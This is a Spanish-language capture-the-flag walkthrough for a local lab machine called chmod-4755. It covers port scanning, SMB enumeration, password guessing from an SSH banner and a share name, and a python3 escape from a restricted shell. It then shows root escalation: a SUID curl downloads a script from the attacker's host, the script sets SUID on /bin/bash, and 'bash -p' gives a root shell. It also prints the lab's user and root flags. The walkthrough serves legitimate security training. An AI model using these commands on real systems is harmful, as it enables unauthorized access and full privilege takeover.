---
icon: flag
---

# CTF chmod-4755 Intermediate

URL Download CTF = [https://drive.google.com/file/d/1NdzO9vNuZNz6z2I7ZdpQU90Ut0NtU6HC/view?usp=sharing](https://drive.google.com/file/d/1NdzO9vNuZNz6z2I7ZdpQU90Ut0NtU6HC/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip chmod-4755.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh chmod-4755.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                                                                          
        v2.0 by d1se0                                                                     
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Creador: d1se0

Maquina: chmod-4755

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 08:28 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000032s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a8:62:07:af:8e:77:13:6d:25:0a:2f:43:63:de:38:38 (ECDSA)
|_  256 93:93:a8:35:0e:fa:3e:05:04:27:70:2e:fc:22:e8:99 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-09-02T12:29:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.52 seconds
```

Vemos que hay un `smb` y un `ssh`, si probamos a conectarnos al `ssh` con cualquier usuario, vemos el siguiente banner.

## Banner SSH

```
ssh test@<IP>
```

Info:

```
**************************************************
*   WARNING: Unauthorized Access is Prohibited!  *
*   This system is for authorized users only.    *
*   All activities are monitored and recorded.   *
*                  by fuckit                     *
**************************************************
test@172.18.0.2's password: 
```

Bastante interesante la palabra `fuckit`, nos la guardaremos.

Si investigamos en el `smb`, lo enumeraremos.

## enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep  2 08:32:29 2024

 =========================================( Target Information )=========================================

Target ........... 172.18.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.18.0.2 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 172.18.0.2 )=================================

Looking up status of 172.18.0.2
No reply from 172.18.0.2

 ====================================( Session Check on 172.18.0.2 )====================================


[+] Server 172.18.0.2 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.18.0.2 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ====================================( OS information on 172.18.0.2 )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for 172.18.0.2 from srvinfo: 
	EE406F2ADE3B   Wk Sv PrQ Unx NT SNT ee406f2ade3b server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ========================================( Users on 172.18.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser	Name: smbuser	Desc: 

user:[smbuser] rid:[0x3e8]

 ==================================( Share Enumeration on 172.18.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	share_secret_only Disk      
	IPC$            IPC       IPC Service (ee406f2ade3b server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.18.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.18.0.2

//172.18.0.2/print$	Mapping: DENIED Listing: N/A Writing: N/A
//172.18.0.2/share_secret_only	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_CONNECTION_REFUSED listing \*
//172.18.0.2/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.18.0.2 )=============================



[+] Attaching to 172.18.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] EE406F2ADE3B
	[+] Builtin

[+] Password Info for Domain: EE406F2ADE3B

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ========================================( Groups on 172.18.0.2 )========================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 172.18.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-65181895-2357771409-242648279 and logon username '', password ''

S-1-5-21-65181895-2357771409-242648279-501 EE406F2ADE3B\nobody (Local User)
S-1-5-21-65181895-2357771409-242648279-513 EE406F2ADE3B\None (Domain Group)
S-1-5-21-65181895-2357771409-242648279-1000 EE406F2ADE3B\smbuser (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\smbuser (Local User)
S-1-22-1-1001 Unix User\rabol (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ================================( Getting printer info for 172.18.0.2 )================================

No printers returned.


enum4linux complete on Mon Sep  2 08:33:09 2024
```

Vemos que hay 2 usuarios `smbuser` (Que sera para el samba) y `rabol` (Que seguramente sea el de ssh).

## SMB

Intentamos conectarnos con el usuario `smbuser` al `smb`, pero nos pedira una contraseña y si probamos a meter la palabra que encontramos en el banner, veremos que nos deja.

```shell
smbclient //<IP>/share_secret_only -U smbuser
```

Metemos la palabra `fuckit` como contraseña y veremos que funciona.

Si listamos veremos un archivo.

```
.                                   D        0  Mon Sep  2 08:05:05 2024
  ..                                  D        0  Mon Sep  2 08:05:05 2024
  note.txt                            N       13  Mon Sep  2 08:05:05 2024
```

Nos lo descargamos ya que no podemos hacer otra cosa.

```shell
get note.txt
```

Y contiene lo siguiente.

```
read better
```

Nos dice que leamos mejor, por lo que si leemos el recurso compartido el nombre que tiene.

```
share_secret_only
```

Probaremos a utilizarlo como contraseña para el usuario `rabol`.

## SSH

```shell
ssh rabol@<IP>
```

Si metemos como contraseña la palabra `share_secret_only` veremos que es la correcta.

### Exit rbash

Una vez dentro veremos que estaremos en una `restricted bash` y solo podremos ejecutar 2 comandos (`ls` y `python3`), pero podremos escapar de ella utilizando `python3` y haciendo lo siguiente.

```shell
python3 -c 'import os; os.system("/bin/bash")'
```

Y con esto ya habremos escapado, pero si intentamos hacer algun otro binario, veremos que no podemos, ya que el `PATH` esta limitado, por lo que nos importaremos el de nuestro host de la siguiente forma.

```shell
export PATH=$PATH:/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Y ahora si podremos hacer los binario y todo, ya que nuestro `PATH` estaria "arreglado", por lo que leeremos la flag.

> user.txt

```
04aee8d6f21f746d0655233aa1d1541a
```

## Escalate Privileges

Si vemos que permisos `SUID` tenemos, veremos los siguientes.

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1600906    336 -rwsr-xr-x   1 root     root       342632 Aug  9 04:33 /usr/lib/openssh/ssh-keysign
  1600867     36 -rwsr-xr--   1 root     messagebus    34960 Aug  9 04:33 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1200588     40 -rwsr-xr-x   1 root     root          40664 Apr  9 09:01 /usr/bin/newgrp
  1600800     56 -rwsr-xr-x   1 root     root          55680 Aug  9 04:33 /usr/bin/su
  1600735     52 -rwsr-xr-x   1 root     root          51584 Aug  9 04:33 /usr/bin/mount
  1600847     40 -rwsr-xr-x   1 root     root          39296 Aug  9 04:33 /usr/bin/umount
  1200457     72 -rwsr-xr-x   1 root     root          72792 Apr  9 09:01 /usr/bin/chfn
  1200463     44 -rwsr-xr-x   1 root     root          44760 Apr  9 09:01 /usr/bin/chsh
  1200524     76 -rwsr-xr-x   1 root     root          76248 Apr  9 09:01 /usr/bin/gpasswd
  1200599     64 -rwsr-xr-x   1 root     root          64152 Apr  9 09:01 /usr/bin/passwd
  1600801    272 -rwsr-xr-x   1 root     root         277936 Apr  8 16:50 /usr/bin/sudo
  1600673    292 -rwsr-xr-x   1 root     root         297288 Aug  9 04:33 /usr/bin/curl
```

Vemos que tenemos permisos `SUID` en el binario `curl`, pero si investigamos mas, vemos en los procesos que se esta ejecutando lo siguiente.

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1 31.2  0.0   2800  1920 ?        Rs   14:26   5:27 /bin/sh -c service smbd start && service ssh start && while true; do /bin/bash /usr/local/bin/bash.sh; done
root          15  0.1  0.1  87360 16916 ?        Ss   14:26   0:01 /usr/sbin/smbd -D
root          24  0.0  0.0  12020  3720 ?        Ss   14:26   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          29  0.0  0.0  84832  6348 ?        S    14:26   0:00 smbd: notifyd .
root          32  0.0  0.0  84840  6092 ?        S    14:26   0:00 smbd: cleanupd 
root      663904  0.0  0.0  14528  7624 ?        Ss   14:39   0:00 sshd: rabol [priv]
rabol     670962  0.5  0.0  14788  6576 ?        S    14:39   0:01 sshd: rabol@pts/0
rabol     671026  0.0  0.0   5016  3840 pts/0    Ss   14:39   0:00 -rbash
rabol     700550  0.0  0.0  15088  9088 pts/0    S    14:39   0:00 python3 -c import os; os.system("/bin/bash")
rabol     700561  0.0  0.0   2800  1792 pts/0    S    14:39   0:00 sh -c -- /bin/bash
rabol     700563  0.0  0.0   5016  3968 pts/0    S    14:39   0:00 /bin/bash
rabol     911756  0.0  0.0   9580  4864 pts/0    R+   14:43   0:00 ps -aux
root      911759  0.0  0.0      0     0 ?        R    14:43   0:00 [bash]
```

Por lo que vemos en esta linea:

```
root           1 31.2  0.0   2800  1920 ?        Rs   14:26   5:27 /bin/sh -c service smbd start && service ssh start && while true; do /bin/bash /usr/local/bin/bash.sh; done
```

`root` esta ejecutando en bucle un archivo llamado `bash.sh` en `/usr/local/bin/` veremos a ver que permisos tiene.

```shell
ls -la /usr/local/bin/bash.sh
```

Info:

```
-rwxr-xr-x 1 root root 1 Sep  2 13:51 /usr/local/bin/bash.sh
```

Vemos que tiene unos permisos normales, por lo que no podremos editarlo, pero como hemos visto antes, tenemos el `curl` con permisos de `SUID`, por lo que podremos hacer lo siguiente.

En nuestra maquina host crearemos un archivo que se llame igual al de la maquina victima.

> bash.sh

```shell
nano bash.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y abriremos un servidor de `python3` en la maquina host.

```shell
python3 -m http.server 80
```

Ahora en la maquina victima aprovecharemos los permisos de `SUID` del binario `curl` y nos iremos al siguiente directorio.

```shell
cd /usr/local/bin/
```

Dentro de aqui utilizaremos `curl` para sustituir el archivo `bash.sh` por el contenido de nuestro `hsot`.

```shell
curl -O http://<IP_HOST>/bash.sh
```

Info:

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    34  100    34    0     0   6930      0 --:--:-- --:--:-- --:--:--  8500
```

Ahora si leemos el archivo `bash.sh`.

```shell
cat bash.sh
```

Info:

```shell
#!/bin/bash

chmod u+s /bin/bash
```

Veremos que funciono correctamente y si vemos los permisos de la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Vemos que funciono, por lo que haremos lo siguiente.

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que leeremos la flag.

> root.txt

```
1e4e4054308a62a2bbaacd02074f1ad2
```
